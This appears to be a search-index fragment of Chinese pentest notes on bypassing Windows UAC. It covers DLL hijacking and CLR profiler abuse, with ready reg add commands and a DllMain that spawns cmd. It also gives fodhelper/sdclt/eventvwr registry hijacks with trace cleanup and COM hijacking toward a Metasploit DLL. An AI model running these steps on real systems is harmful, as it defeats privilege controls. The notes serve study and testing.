\u76f8\u5bf9\u8def\u5f84DLL\u52ab\u6301\uff1a\u5c06\u5408\u6cd5\u7684\u5e94\u7528\u7a0b\u5e8f\u590d\u5236\uff08\u5e76\u6709\u9009\u62e9\u5730\u91cd\u547d\u540d\uff09\u4e0e\u6076\u610f\u7684DLL\u4e00\u8d77\u653e\u5165\u5230\u7528\u6237\u53ef\u5199\u7684\u6587\u4ef6\u5939\u4e2d\u3002\u5728\u4f7f\u7528\u65b9\u6cd5\u4e0a\uff0c\u5b83\u4e0e\uff08\u7b7e\u540d\u7684\uff09\u4e8c\u8fdb\u5236\u4ee3\u7406\u6267\u884c\u6709\u76f8\u4f3c\u4e4b\u5904\u3002\u5b83\u7684\u4e00\u4e2a\u53d8\u4f53\u662f\uff08\u6709\u70b9\u77db\u76fe\u5730\u79f0\u4e3a\uff09\u201c\u81ea\u5e26LOLbin\u201d\uff0c\u5176\u4e2d\u5408\u6cd5\u7684\u5e94\u7528\u7a0b\u5e8f\u5e26\u6709\u6076\u610f\u7684DLL\uff08\u800c\u4e0d\u662f\u4ece\u53d7\u5bb3\u8005\u673a\u5668\u4e0a\u7684\u5408\u6cd5\u4f4d\u7f6e\u590d\u5236\uff09\u3002 \u5b9e\u8df5\u51fa\u771f\u77e51 \u8fd9\u91cc\u6211\u4eec\u5148\u7528\u7b2c\u4e00\u79cd\u65b9\u6cd5\u6765\u8fdb\u884c\u5b9e\u9a8c\uff0c\u5b9e\u9a8c\u5bf9\u8c61\u662fC:\\Windows\\SysWOW64\\SystemPropertiesAdvanced.exe\u548cListary\u3002Listary\u662f\u4e00\u4e2a\u5f88\u597d\u7528\u7684\u68c0\u7d22\u5c0f\u5de5\u5177\uff0c\u6211\u901a\u8fc7processmonitor\uff0c\u8bbe\u7f6e\u597d\u8fc7\u6ee4\u6761\u4ef6\uff0c\u67e5\u770bSystemPropertiesAdvanced.exe\u8c03\u7528\u7684dll\u65f6\u53d1\u73b0\u5b83\u4f1a\u8c03\u7528\u4e00\u4e2aListary\u4e0b\u7684\u4e00\u4e2a\u540d\u4e3aListaryHook.dll\u7684dll\u3002 \u7531\u4e8elistary\u76ee\u5f55\u6743\u9650\u4e0d\u9ad8\uff0c\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u66ff\u6362\u8be5dll\uff0c\u6362\u6210dllmain\u4e3a\u6253\u5f00cmd\u7684dll\u3002\u7136\u540e\u70b9\u51fb\u8fd0\u884cSystemPropertiesAdvanced.exe\uff0c\u5c31\u4f1a\u53d1\u73b0\u4f1a\u5f39\u51fa\u9ad8\u6743\u9650cmd\u7a97\u53e3 bypassuac\u6210\u529f\u3002 \u5f53\u7136\u8fd9\u79cd\u90fd\u4e0d\u80fd\u7b97\u662f\u4e00\u4e2a\u6d1e\uff0clistary\u5e76\u4e0d\u662f\u4eba\u4eba\u7535\u8111\u4e0a\u90fd\u6709\u7684\uff0c\u800c\u4e14\u8fd9\u4e2a\u8f6f\u4ef6\u88c5\u673a\u91cf\u5e94\u8be5\u662f\u6781\u5c11\u6570\u5c11\u7684\uff0c\u6240\u4ee5\u8fd9\u91cc\u53ea\u662f\u63d0\u4f9b\u4e00\u4e2a\u601d\u8def\uff0c\u8fd9\u79cd\u6d1e\u8be5\u600e\u4e48\u53bb\u627e\u3002 \u5b9e\u8df5\u51fa\u771f\u77e52 \u8fd9\u91cc\u4f7f\u7528\u7b2c\u4e09\u79cd\u65b9\u6cd5\u8fdb\u884c\u5b9e\u9a8c\uff0c\u5b9e\u9a8c\u5bf9\u8c61\u662feventvwr.msc\uff0c\u5b83\u662f\u7ba1\u7406\u5de5\u5177\u4e2d\u7684\u4e8b\u4ef6\u67e5\u770b\u5668\uff0c\u5b83\u4f9d\u8d56\u4e8emmc.exe\u6765\u8fd0\u884c\u3002\u6bd4\u5982\uff0c\u4f60\u60f3\u8fd0\u884c\u5b83\uff0c\u5c31\u5f97\u901a\u8fc7mmc eventvwr.msc\u6765\u8fd0\u884c\u5b83,\u5e76\u4e14\u5728process exploer\u4e2d\u53ea\u80fd\u770b\u5230\u4e2ammc.exe\u3002 \u6211\u4eecprocess monitor\u8bbe\u7f6e\u8fc7\u6ee4\u5982\u4e0b cmd\u8fd0\u884c mmc eventvwr.msc,\u67e5\u770b\u8c03\u7528 dll\u641c\u7d22\u987a\u5e8f\u786e\u5b9e\u662f \u7a0b\u5e8f\u76ee\u5f55->SYSTEM32->SYSTEM->WINDOWS->\u5f53\u524d\u76ee\u5f55\uff08\u8fd9\u91cc\u4e5f\u662fSYSTEM32\u76ee\u5f55\uff0c\u6211\u8ba4\u4e3a\u7684\u539f\u56e0\u662fmmc\u4f1a\u81ea\u52a8\u63d0\u5347\u6743\u9650\u5bfc\u81f4\u5f53\u524d\u76ee\u5f55\u4e3aSystem32\u5bfc\u81f4\u7684\uff09->PATH\u76ee\u5f55\u3002 \u6211\u4eec\u53ea\u9700\u5728\u53ef\u5199\u76ee\u5f55\u4e0b\u690d\u5165\u540d\u4e3aelsext.dll\u7684\u6076\u610fdll\uff0c\u5904\u7406\u597ddll\u7684dllmain\u51fd\u6570\uff0c\u5c31\u80fd\u8ba9dllmain\u91cc\u7684\u6307\u4ee4\u88ab\u9ad8\u6743\u9650\u6267\u884c \u4f46\u662f\u65e0\u5948\u6211\u8fd9\u91cc\u73af\u5883\u662fwin7 sp1,\u4f46\u662f\u8fd9\u4e2a\u6d1e7600\u624d\u51fa\u73b0\uff0c\u6240\u4ee5\u590d\u73b0\u4e0d\u4e86\u4e86\u3002\u4f46\u5927\u6982\u601d\u8def\u5c31\u662f\u8fd9\u6837\u7684 CLR\u52a0\u8f7d\u4efb\u610fDLL CLR\u662f\u5fae\u8f6f\u4e3a.net\u8fd0\u884c\u65f6\u63d0\u4f9b\u7684\u73af\u5883\uff0c\u50cfjava\u7684\u865a\u62df\u673a\u4e00\u6837\uff0c\u800cclr\u6709\u4e00\u4e2aProfiling\u673a\u5236\u3002\u8fd9\u4e2a\u673a\u5236\u7b80\u800c\u8a00\u4e4b\u4fbf\u662f\u53ef\u4ee5\u7ed9CLR\u63d0\u4f9b\u4e00\u4e2adll\uff0c\u5f53\u4efb\u4f55\u9ad8\u6743\u9650.NET\u8fd0\u884c\u65f6\u90fd\u4f1a\u4e3b\u52a8\u52a0\u8f7d\u8be5DLL\uff0c\u6211\u4eec\u53ef\u4ee5\u6784\u9020\u6076\u610fdll\u7ed9CLR\u52a0\u8f7d\uff0c\u4ece\u800c\u83b7\u5f97\u9ad8\u6743\u9650\u7684\u8fdb\u7a0b\u5982cmd\uff0c\u4ece\u800cbypassuac\u3002 \u81f3\u4e8e\u8fd9\u4e2adll\u5982\u4f55\u7ed9CLR\uff0c\u662f\u901a\u8fc7\u4fee\u6539\u4ee5\u4e0b\u73af\u5883\u53d8\u91cf\u5b9e\u73b0\u7684 COR_ENABLE_PROFILING = 1 COR_PROFILER={CLSIDor ProgID} CLR\u4f1a\u68c0\u67e5\u73af\u5883\u53d8\u91cf\u4e2d\u7684COR_ENABLE_PROFILING\uff0c\u82e5\u4e3a1\u5219\u68c0\u67e5\u901a\u8fc7\uff0c\u8fdb\u884c\u4e0b\u4e00\u6b65\u3002 \u5728net4.0\u4ee5\u524d\uff0c\u82e5\u68c0\u67e5\u901a\u8fc7\uff0c\u4f1a\u9a6c\u4e0a\u53bb\u67e5\u627eCOR_PROFILER\u6307\u5b9a\u7684\u6ce8\u518c\u8868\u9879\uff0c\u627e\u5230\u5176dll\u8def\u5f84\u5e76\u52a0\u8f7d net4.0\u540e\uff0c\u4f1a\u5148\u67e5\u627eCOR_PROFILER_PATH\u662f\u5426\u6307\u5b9adll\u6587\u4ef6\u8def\u5f84\uff0c\u82e5\u6ca1\u6709\u518d\u53bb\u67e5\u627eCOR_PROFILER\u6307\u5b9a\u7684\u6ce8\u518c\u8868\u9879\uff0c\u627e\u5230\u5176dll\u8def\u5f84\u5e76\u52a0\u8f7d\u3002 \u603b\u800c\u8a00\u4e4b\uff0c\u6211\u4eec\u8bbe\u7f6e\u597dCOR_ENABLE_PROFILING\u548cCOR_PROFILER\u4e24\u4e2a\u9879\u5c31\u53ef\u4ee5\u4e86\u3002 \u63a5\u4e0b\u6765\u6211\u4eec\u8bbe\u7f6e\u7528\u6237\u73af\u5883\u53d8\u91cf\uff0c\u8bbe\u7f6e\u7528\u6237\u73af\u5883\u53d8\u91cf\u65f6\u4e0d\u9700\u8981\u9ad8\u6743\u9650\uff08win10\u4f3c\u4e4e\u8bbe\u7f6e\u7cfb\u7edf\u73af\u5883\u53d8\u91cf\u4e5f\u4e0d\u9700\u8981\uff09\u3002 \u4ee5\u53ca\u5728\u6ce8\u518c\u8868\uff0c\u5728\u6307\u5b9a\u7684CLSID\u5c5e\u6027\u4e0b\u65b0\u5efaInprocserver32\u9879\uff0c\u5e76\u5199\u5165\u6076\u610fdll\u8def\u5f84. \u7136\u540e\u901a\u8fc7mmc\u8c03\u7528\u4e00\u4e0bgpedit.msc\u8fd9\u79cd\u7a0b\u5e8f\uff0c\u5373\u53ef\u4ee5\u9ad8\u6743\u9650\u6267\u884cdll\u3002\u5982\u679cdll\u6267\u884c\u547d\u4ee4\u4e3asystem(\"cmd.exe\") \u90a3\u4e48\u5c31\u4f1a\u8e66\u51fa\u6765\u9ad8\u6743\u9650cmd\u7a97\u53e3 REG ADD \"HKCU\\Software\\Classes\\CLSID\\{FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF}\\InprocServer32\" /ve /t REG_EXPAND_SZ /d \"C:\\test\\calc.dll\" /f REG ADD \"HKCU\\Environment\" /v \"COR_PROFILER\" /t REG_SZ /d \"{FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF}\" /f REG ADD \"HKCU\\Environment\" /v \"COR_ENABLE_PROFILING\" /t REG_SZ /d \"1\" /f mmc gpedit.msc \u4f46\u6211\u6b7b\u6d3b\u590d\u73b0\u4e0d\u8d77\u4e0d\u77e5\u9053\u4e3a\u5565\uff0c\u6211\u7684dll\u8fd9\u6837\u5199\u7684 // dllmain.cpp : \u5b9a\u4e49 DLL \u5e94\u7528\u7a0b\u5e8f\u7684\u5165\u53e3\u70b9\u3002 #include \"pch.h\" #include <iostream> #include <Windows.h> BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) { char cmd[] = \"cmd.exe\"; switch (fdwReason) { case DLL_PROCESS_ATTACH: WinExec(cmd, SW_SHOWNORMAL); ExitProcess(0); break; case DLL_THREAD_ATTACH: break; case DLL_THREAD_DETACH: break; case DLL_PROCESS_DETACH: break; } return TRUE; } \u53e6\u5916\u7684\uff0c\u4f60\u8fd8\u53ef\u4ee5\u4e3aCOR_PROFILER_PATH\u8bbe\u7f6e\u4e3a\u5982\\\\server\\share\\test.dll\u7684smb\u7684\u8def\u5f84\uff0c\u8fd9\u6837\u4e5f\u53ef\u4ee5\u5b9e\u73b0bypassuac\uff08\u6ca1\u590d\u73b0\uff09 \u767d\u540d\u5355\u7a0b\u5e8f odbcad32.exe \u8fd9\u4e2a\u65b9\u6cd5\u5f88\u7b80\u5355\u3002\u6253\u5f00C:\\Windows\\system32\\odbcad32.exe\uff0c\u7136\u540e\u901a\u8fc7\u4ee5\u4e0b\u65b9\u6cd5\u6253\u5f00powershell\u6216\u8005cmd \u6210\u529fbypass \u7ba1\u7406\u5de5\u5177 \u4e4b\u524d\u8bf4\u8fc7\uff0c\u7ba1\u7406\u5de5\u5177\u6709\u5f88\u591a\u767d\u540d\u5355\u7a0b\u5e8f\uff0c\u5982\u679c\u4e00\u4e2a\u767d\u540d\u5355\u7a0b\u5e8f\u6709\u6d4f\u89c8\u6587\u4ef6\u76ee\u5f55\u7684\u529f\u80fd\uff0c\u5c31\u53ef\u4ee5\u4ee5\u6b64\u6765\u521b\u5efa\u9ad8\u6743\u9650cmd\u7a97\u53e3\u3002\u8fd9\u91cc\u62ff\u4e8b\u4ef6\u67e5\u770b\u5668\u4e3e\u4f8b \u64cd\u4f5c-\u300b\u6253\u5f00\u4fdd\u5b58\u7684\u76ee\u5f55-\u300b\u6587\u4ef6\u76ee\u5f55\u8def\u5f84\u5904\u8f93\u5165powershell-\u300b\u5f39\u51fa\u9ad8\u6743\u9650powershell \u4ee5\u6b64\u5185\u63a8\uff0c\u8fd8\u6709\u5f88\u591a\u76f8\u4f3c\u7684\u7ba1\u7406\u5de5\u5177\u53ef\u4ee5\u8fd9\u6837\u5229\u7528 \u6ce8\u518c\u8868\u52ab\u6301 Fodhelper.exe Fodhelper.exe win10\u624d\u6709\uff0c\u6240\u4ee5\u53ea\u6709win10\u80fd\u901a\u8fc7\u8fd9\u4e2a\u529e\u6cd5bypassuac\uff0c\u4ed6\u662f\u4e00\u4e2aautoelevate\u5143\u7d20\u7a0b\u5e8f \u6211\u4eec\u4f7f\u7528proceemonitor\u67e5\u770b\u4e8b\u4ef6\u67e5\u770b\u5668\u542f\u52a8\u7684\u65f6\u5019\u6267\u884c\u4e86\u4ec0\u4e48\u3002\u6211\u4eec\u901a\u8fc7\u6392\u67e5\u53d1\u73b0\u4e86\u6b64\u5904 \u53d1\u73b0\u7a0b\u5e8f\u8bd5\u56fe\u6253\u5f00HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command\uff0c\u4f46\u662f\u8fd9\u4e2a\u9879\u6ca1\u6709\u627e\u5230\uff0c\u56e0\u4e3a\u8fd9\u4e2a\u9879\u5e76\u4e0d\u5b58\u5728\uff0c\u4e8e\u662f\u5b83\u67e5\u8be2 HKCR\\ms-settings\\Shell\\Open,\u67e5\u8be2\u6210\u529f\u4fbf\u6253\u5f00\u5176\u4e0b\u7684Command\u952e\u8fdb\u884c\u67e5\u8be2\u3002 \u6211\u4eec\u53ef\u4ee5\u52ab\u6301\u6ce8\u518c\u8868\uff0c\u5f80HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command\u5199\u5165\u6076\u610f\u6307\u4ee4\u4ece\u800c\u8fbe\u5230bypassuac\u7684\u76ee\u7684\u3002 reg add HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\shell\\open\\command /d C:\\Windows\\System32\\cmd.exe /f reg add HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\shell\\open\\command /v DelegateExecute /t REG_DWORD /d 00000000 /f \u6211\u4eec\u5199\u5165\u5982\u4e0b\u547d\u4ee4\uff0c\u5c31\u80fd\u8ba9Fodhelper.exe \u6267\u884c\u65f6\u81ea\u52a8\u9ad8\u6743\u9650\u6267\u884ccmd\u7a97\u53e3\u4e86 \u7136\u540e\u6d88\u9664\u75d5\u8ff9 reg delete \"HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\shell\\open\\command\" sdclt Win10\u540e\u8fd9\u4e2a\u7a0b\u5e8f\u624d\u6709\u81ea\u52a8\u63d0\u5347\u6743\u9650\u7684\u80fd\u529b reg add \"HKCU\\Software\\Classes\\Folder\\shell\\open\\command\" /d C:\\Windows\\System32\\cmd.exe /f reg add \"HKCU\\Software\\Classes\\Folder\\shell\\open\\command\" /v \"DelegateExecute\" /f eventvmr reg add \"HKCU\\Software\\Classes\\mscfile\\shell\\open\\command\" /d C:\\Windows\\System32\\cmd.exe /f win10\uff0cwin7\u5747\u65e0\u6548,\u4e0d\u77e5\u9053\u662f\u54ea\u4e2a\u7248\u672c\u7684\u4e8b\u4e86\uff0c\u53cd\u6b63\u8bb0\u5f55\u4e0b\u6765\u5427\u3002 COM\u52ab\u6301 \u548cdll\u52ab\u6301\u7c7b\u4f3c\uff0c\u5e94\u7528\u7a0b\u5e8f\u5728\u8fd0\u884c\u65f6\u4e5f\u4f1a\u53bb\u52a0\u8f7d\u6307\u5b9aCLSID\u7684COM\u7ec4\u4ef6\uff0c\u5176\u52a0\u8f7d\u987a\u5e8f\u5982\u4e0b HKCU\\Software\\Classes\\CLSID HKCR\\CLSID HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ShellCompatibility\\Objects\\ \u4ee5eventvwr\u4e3a\u4f8b \u6267\u884c\u8be5\u7a0b\u5e8f\u65f6\u4f1a\u53bb\u5bfb\u627e{0A29FF9E-7F9C-4437-8B11-F424491E3931}\u8fd9\u4e2a\u7ec4\u4ef6\uff0c\u8fd9\u4e2a\u7ec4\u4ef6\u53c8\u9700\u8981\u52a0\u8f7dInProcServer32\u6307\u5b9a\u7684DLL\uff0c\u800c\u8fd9\u4e2aDLL\u7684\u8def\u5f84\u53ef\u7531\u7528\u6237\u5b9a\u4e49\u3002 \u800ceventvwr\u7684\u8fd9\u4e2a\u7ec4\u4ef6\u4e00\u822c\u5728HKCR\\CLSID\u627e\u5230\uff0c\u6240\u4ee5\u53ef\u4ee5\u641c\u7d22\u8def\u5f84\u52ab\u6301\u3002 \u5229\u7528\u4ee5\u4e0b\u65b9\u6cd5\u53ef\u4ee5\u52ab\u6301\uff08\u641c\u7d22\u8def\u5f84\u52ab\u6301\uff09 reg add HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\{0A29FF9E-7F9C-4437-8B11-F424491E3931}\\InProcServer32 /v \"\" /t REG_SZ /d \"d:\\msf_x64.dll\" /f reg add HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\{0A29FF9E-7F9C-4437-8B11-F424491E3931}\\InProcServer32 /v \"LoadWithoutCOM\" /t REG_SZ /d \"\" /f reg add HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\{0A29FF9E-7F9C-4437-8B11-F424491E3931}\\InProcServer32 /v \"ThreadingModel\" /t REG_SZ /d \"Apartment\" /f reg add HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\{0A29FF9E-7F9C-4437-8B11-F424491E3931}\\ShellFolder /v \"HideOnDesktop\" /t REG_SZ /d \"\" /f reg add HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\{0A29FF9E-7F9C-4437-8B11-F424491E3931}\\ShellFolder /v \"Attributes\" /t REG_DWORD /d 0xf090013d /f \u5229\u7528com\u63a5\u53e3 ICMLuaUtil UACME \u4e00\u4e2a\u5f00\u6e90\u9879\u76ee\uff0c\u8bb0\u5f55\u4e86\u8bb8\u591aBypassuac\u7684\u65b9\u6cd5\u3002 https://github.com/hfiref0x/UACME/tree/v3.2.x windbg\u8c03\u8bd5 \u5927\u5bb6\u81ea\u5df1\u627e\u8d44\u6599\u73a9\uff0c\u56e0\u4e3a\u6211\u4e5f\u4e0d\u4f1a","title":"Bypass UAC"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/Bypass%20UAC/Bypass%20UAC/#bypass-uac","text":"","title":"Bypass UAC"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/Bypass%20UAC/Bypass%20UAC/#_1","text":"UAC autoElevate\u4e0erequestedExecutionLevel autoElevate requestedExecutionLevel \u767d\u540d\u5355\u7a0b\u5e8f DLL\u52ab\u6301 \u5b9e\u8df5\u51fa\u771f\u77e51 \u5b9e\u8df5\u51fa\u771f\u77e52 CLR\u52a0\u8f7d\u4efb\u610fDLL \u767d\u540d\u5355\u7a0b\u5e8f odbcad32.exe \u7ba1\u7406\u5de5\u5177 \u6ce8\u518c\u8868\u52ab\u6301 Fodhelper.exe sdclt eventvmr COM\u52ab\u6301 \u5229\u7528com\u63a5\u53e3 ICMLuaUtil UACME windbg\u8c03\u8bd5","title":"\u76ee\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/Bypass%20UAC/Bypass%20UAC/#uac","text":"\u7528\u6237\u5e10\u6237\u63a7\u5236\uff08User Account Control\uff0c\u7b80\u5199\u4f5cUAC)\u662f \u5fae\u8f6f \u516c\u53f8\u5728\u5176[Windows Vista]( https://baike.baidu.com/item/Windows Vista)\u53ca\u66f4\u9ad8\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u91c7\u7528\u7684\u4e00\u79cd\u63a7\u5236\u673a\u5236\uff0c\u4fdd\u62a4\u7cfb\u7edf\u8fdb\u884c\u4e0d\u5fc5\u8981\u7684\u66f4\u6539\uff0c\u63d0\u5347\u64cd\u4f5c\u7cfb\u7edf\u7684\u7a33\u5b9a\u6027\u548c\u5b89\u5168\u6027\u3002 \u7ba1\u7406\u5458\u5728\u6b63\u5e38\u60c5\u51b5\u4e0b\u662f\u4ee5\u4f4e\u6743\u9650\u8fd0\u884c\u4efb\u52a1\u7684\uff0c\u8fd9\u4e2a\u72b6\u6001\u88ab\u79f0\u4e3a\u88ab\u4fdd\u62a4\u7684\u7ba1\u7406\u5458\u3002\u4f46\u5f53\u7ba1\u7406\u5458\u8981\u6267\u884c\u9ad8\u98ce\u9669\u64cd\u4f5c\uff08\u5982\u5b89\u88c5\u7a0b\u5e8f\u7b49\uff09\uff0c\u5c31\u9700\u8981\u63d0\u5347\u6743\u9650\u53bb\u5b8c\u6210\u8fd9\u4e9b\u4efb\u52a1\u3002\u8fd9\u4e2a\u63d0\u5347\u6743\u9650\u7684\u8fc7\u7a0b\u901a\u5e38\u662f\u8fd9\u6837\u7684\uff0c\u76f8\u4fe1\u5404\u4f4d\u90fd\u773c\u719f\u8fc7\u3002 \u70b9\u51fb\u201c\u662f\u201d\uff0c\u7ba1\u7406\u5458\u5c31\u4f1a\u63d0\u5347\u5230\u9ad8\u6743\u9650\u518d\u53bb\u8fd0\u884c\u8be5\u4efb\u52a1\u3002","title":"UAC"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/Bypass%20UAC/Bypass%20UAC/#autoelevaterequestedexecutionlevel","text":"","title":"autoElevate\u4e0erequestedExecutionLevel"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/Bypass%20UAC/Bypass%20UAC/#autoelevate","text":"\u5f53\u67d0\u4e2aEXE\u6587\u4ef6\u7684\u6587\u4ef6\u6e05\u5355\u91cc\u6709\\ \u5143\u7d20\u65f6\uff0c\u5f53\u6267\u884c\u8be5\u6587\u4ef6\u65f6\u4f1a\u9ed8\u8ba4\u63d0\u6743\u6267\u884c\u3002 \u6211\u4eec\u52ab\u6301\u8be5exe\u6587\u4ef6\u7684dll\uff0c\u53ef\u4ee5\u8fbe\u5230Bypass UAC\u63d0\u6743\u7684\u76ee\u7684\u3002 \u9002\u7528\u8303\u56f4:\u7ba1\u7406\u5458\u6743\u9650\u4ee5\u83b7\u5f97\uff0c\u8981\u5f97\u5230\u9ad8\u6743\u9650\u7ba1\u7406\u5458\u6743\u9650 \u4e00\u822c\u7528\u5de5\u5177sigcheck\u68c0\u6d4b \u7f51\u4e0a\u5e38\u62ffC:\\Windows\\SysWOW64\\SystemPropertiesAdvanced.exe \u4e3e\u5217\u5b50 \u8fd9\u4e2a\u4e1c\u897f\u5f88\u6709\u7528\uff0c\u662f\u4e0b\u9762\u90e8\u5206\u65b9\u6cd5\u7684\u524d\u63d0\u6761\u4ef6","title":"autoElevate"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/Bypass%20UAC/Bypass%20UAC/#requestedexecutionlevel","text":"\u6709\u4e09\u4e2a\u4e0d\u540c\u7684\u53c2\u6570\uff1aasInvoker requireAdministrator highestAvailable \u5206\u522b\u5bf9\u5e94\u5e94\u7528\u7a0b\u5e8f\u4ee5\u4ec0\u4e48\u6743\u9650\u8fd0\u884c asInvoker\uff1a\u7236\u8fdb\u7a0b\u662f\u4ec0\u4e48\u6743\u9650\uff0c\u6b64\u5e94\u7528\u7a0b\u5e8f\u5c31\u662f\u4ec0\u4e48\u6743\u9650 requireAdministrator\uff1a\u9700\u8981\u4ee5\u7ba1\u7406\u5458\u6743\u9650\u6765\u8fd0\u884c\uff0c\u6b64\u7c7b\u5e94\u7528\u7a0b\u5e8f\u56fe\u6807\u53f3\u4e0b\u65b9\u4f1a\u6709\u4e2a\u76fe\u724c\u6807\u8bb0 highestAvailable\uff1a\u6b64\u7a0b\u5e8f\u4ee5\u5f53\u524d\u7528\u6237\u80fd\u83b7\u53d6\u5230\u7684\u6700\u9ad8\u6743\u9650\u8fd0\u884c\u3002\u5f53\u4f60\u5728\u7ba1\u7406\u5458\u8d26\u6237\u4e0b\u8fd0\u884c\u6b64\u7a0b\u5e8f\u5c31\u4f1a\u8981\u6c42\u6743\u9650\u63d0\u5347\u4ee5\u53ca\u5f39\u51faUAC\u6846\u3002\u5f53\u4f60\u5728\u6807\u51c6\u8d26\u6237\u4e0b\u8fd0\u884c\u6b64\u7a0b\u5e8f\uff0c\u7531\u4e8e\u6b64\u8d26\u6237\u7684\u6700\u9ad8\u6743\u9650\u5c31\u662f\u6807\u51c6\u8d26\u6237\uff0c\u6240\u4ee5\u53cc\u51fb\u4fbf\u8fd0\u884c","title":"requestedExecutionLevel"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/Bypass%20UAC/Bypass%20UAC/#_2","text":"\u9664\u4e86\u521a\u521a\u8bf4\u7684autoelevate\uff0c\u8fd8\u6709\u4e00\u7c7b\u53eb\u767d\u540d\u5355\u7a0b\u5e8f\u7684\u5e94\u7528\u7a0b\u5e8f\u4e5f\u662f\u6253\u5f00\u9ed8\u8ba4\u63d0\u6743\u7684\u3002\u5982\u670d\u52a1\u7ba1\u7406\u5de5\u5177\u4e0b\u7684\u8bb8\u591a\u5e94\u7528\u90fd\u5c5e\u4e8e\u767d\u540d\u5355\u7a0b\u5e8f\uff0c\u800c\u5176\u4e2d\u53c8\u6709\u4e9b\u7a0b\u5e8f\u6267\u884c\u65f6\u9700\u8981\u4f9d\u8d56CLR\u652f\u6301\uff08\u5982\u4e8b\u4ef6\u67e5\u770b\u5668\uff0c\u4efb\u52a1\u8ba1\u5212\u7a0b\u5e8f\uff09","title":"\u767d\u540d\u5355\u7a0b\u5e8f"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/Windows%E6%8F%90%E6%9D%83/Bypass%20UAC/Bypass%20UAC/#dll","text":"reference: https://www.anquanke.com/post/id/209033 https://www.cnblogs.com/0daybug/p/11719541.html exe\u6587\u4ef6\u8fd0\u884c\u65f6\u4f1a\u52a0\u8f7d\u8bb8\u591adll\u6587\u4ef6\uff0c\u8fd9\u4e9bdll\u6587\u4ef6\u7684\u52a0\u8f7d\u987a\u5e8f\u662f \u7a0b\u5e8f\u6240\u5728\u76ee\u5f55 \u7cfb\u7edf\u76ee\u5f55\u5373 SYSTEM32 \u76ee\u5f55 16\u4f4d\u7cfb\u7edf\u76ee\u5f55\u5373 SYSTEM \u76ee\u5f55 Windows \u76ee\u5f55 \u7a0b\u5e8f\u52a0\u8f7d\u76ee\u5f55( SetCurrentDirecctory ) PATH \u73af\u5883\u53d8\u91cf\u4e2d\u5217\u51fa\u7684\u76ee\u5f55 \u540c\u65f6\uff0cdll\u52a0\u8f7d\u4e5f\u9075\u5faa\u7740 Know DLLs\u6ce8\u518c\u8868\u9879 \u7684\u673a\u5236\uff1aKnow DLLs\u6ce8\u518c\u8868\u9879\u6307\u5b9a\u7684DLL\u662f\u5df2\u7ecf\u88ab\u64cd\u4f5c\u7cfb\u7edf\u52a0\u8f7d\u8fc7\u540e\u7684DLL\uff0c\u4e0d\u4f1a\u88ab\u5e94\u7528\u7a0b\u5e8f\u641c\u7d22\u5e76\u52a0\u8f7d\u3002\u5728\u6ce8\u518c\u8868HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\KnownDLLS\u5904\u53ef\u4ee5\u770b\u89c1\u8fd9\u4e9bdll \u5728knowdlls\u8868\u9879\u4e2d\u7684dll\u662f\u9884\u5148\u5c31\u52a0\u8f7d\u8fdb\u5185\u5b58\u7a7a\u95f4\u7684\uff0c\u88ab\u8bf8\u591a\u5e94\u7528\u8c03\u7528\u7740\uff0c\u6539\u52a8\u9700\u8981\u9ad8\u6743\u9650\u3002 